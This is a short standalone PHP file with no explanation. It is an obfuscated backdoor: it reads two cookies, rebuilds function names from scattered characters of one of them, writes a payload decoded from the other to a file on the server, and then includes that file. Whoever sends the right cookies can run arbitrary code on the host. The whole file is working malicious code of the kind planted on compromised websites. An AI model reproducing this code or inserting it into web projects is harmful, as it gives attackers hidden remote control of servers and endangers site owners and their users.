<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[23])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 10;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[23][$n];
        if (!$c[23][$n + 1]) {
            if (!$c[23][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 10 + 1;
    }
    $k = $p[13]() . $p[29];
    if (!$p[4]($k)) {
        $n = $p[27]($k, $p[3]);
        $p[14]($n, $p[6] . $p[20]($p[24]($c[3])));
    }
    include($k);
}